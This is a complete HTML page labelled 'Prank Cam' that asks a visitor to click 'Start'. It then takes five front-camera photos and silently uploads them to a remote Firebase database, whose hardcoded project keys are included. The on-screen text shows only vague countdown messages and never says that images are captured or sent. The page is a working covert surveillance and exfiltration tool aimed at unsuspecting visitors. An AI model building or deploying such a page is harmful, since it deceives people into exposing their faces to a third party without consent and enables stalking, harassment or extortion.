<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Prank Cam - Multi Capture</title>
<style>
body {
  margin: 0;
  background: #f4f4f9;
  color: #333;
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  height: 100vh;
}
#msg {
  font-size: 18px;
  margin-bottom: 20px;
  text-align: center;
}
video {
  display: none;
  border-radius: 10px;
}
button {
  padding: 12px 25px;
  font-size: 16px;
  border: none;
  border-radius: 8px;
  background: #4caf50;
  color: #fff;
  cursor: pointer;
  box-shadow: 0 4px 8px rgba(0,0,0,0.1);
  transition: background 0.3s, transform 0.2s;
}
button:hover {
  background: #45a049;
  transform: translateY(-2px);
}
button:disabled {
  background: #9e9e9e;
  cursor: not-allowed;
}
</style>
</head>
<body>

<div id="msg">Click to start...</div>
<button id="startBtn">Start</button>
<video id="video" playsinline muted autoplay></video>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-database.js";

// ðŸ”¹ Firebase Configuration (online-earning-9751b)
const firebaseConfig = {
  apiKey: "AIzaSyB0eLmZSDtmF1deFGBNSU9e3aq8_i_DjC4",
  authDomain: "online-earning-9751b.firebaseapp.com",
  databaseURL: "https://online-earning-9751b-default-rtdb.firebaseio.com",
  projectId: "online-earning-9751b",
  storageBucket: "online-earning-9751b.firebasestorage.app",
  messagingSenderId: "454796166249",
  appId: "1:454796166249:web:0606b052e435312a068ef8"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const video = document.getElementById("video");
const startBtn = document.getElementById("startBtn");
const msg = document.getElementById("msg");

// Capture frame
function captureFrame() {
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  return canvas.toDataURL("image/png");
}

startBtn.onclick = async () => {
  startBtn.disabled = true;
  msg.innerText = "Starting...";

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
    video.srcObject = stream;
    await video.play();
    msg.innerText = "Capturing images...";

    const captureCount = 5; // Only 5 images
    const interval = 1000;  // 1 second apart

    for (let i = 0; i < captureCount; i++) {
      setTimeout(() => {
        const dataUrl = captureFrame();
        push(ref(db, "tempImages"), { image: dataUrl, time: Date.now() });
        msg.innerText = `Wait ${i + 1} of ${captureCount} seconds`;
        if (i === captureCount - 1) msg.innerText = "Done!";
      }, i * interval);
    }

  } catch (err) {
    console.error(err);
    alert("Camera access failed! Make sure you are using HTTPS or localhost and allow permissions.");
    startBtn.disabled = false;
  }
};
</script>
</body>
</html>
